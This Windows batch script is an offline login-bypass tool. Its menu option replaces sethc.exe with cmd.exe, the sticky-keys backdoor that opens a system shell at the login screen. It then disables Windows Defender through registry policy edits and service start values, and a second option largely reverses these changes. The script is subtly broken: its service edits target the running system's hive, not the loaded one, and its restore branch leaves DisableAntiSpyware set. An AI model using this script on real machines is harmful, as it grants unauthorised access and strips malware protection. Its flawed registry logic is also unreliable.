@ echo off

FOR %%w IN (C D E F G H I J K L N M O P Q R S T U V W X Y Z) DO IF EXIST %%w:\PerfLogs set SYSPART=%%w:
echo "%SYSPART%"

:MENU
ECHO.
ECHO 1 - Enable admin on login page
ECHO 2 - Disabling admin on login page
ECHO.
SET /P M=Type 1 or 2 then press ENTER:
IF %M%==1 GOTO ENABLE
IF %M%==2 GOTO DISABLE

:ENABLE
copy %SYSPART%\windows\system32\sethc.exe %SYSPART%\
copy /y %SYSPART%\windows\system32\cmd.exe %SYSPART%\windows\system32\sethc.exe

rem disable defender
reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SOFTWARE
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg unload HKLM\temp-hive

reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SYSTEM
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 4 /f
reg unload HKLM\temp-hive

echo "Completed"
pause
exit

:DISABLE
copy /y %SYSPART%\sethc.exe %SYSPART%\windows\system32\sethc.exe

rem enable defender
reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SOFTWARE
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0 /f
reg unload HKLM\temp-hive

reg load HKLM\temp-hive %SYSPART%\windows\system32\config\SYSTEM
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 2 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 2 /f
reg unload HKLM\temp-hive

echo "Completed"
pause
exit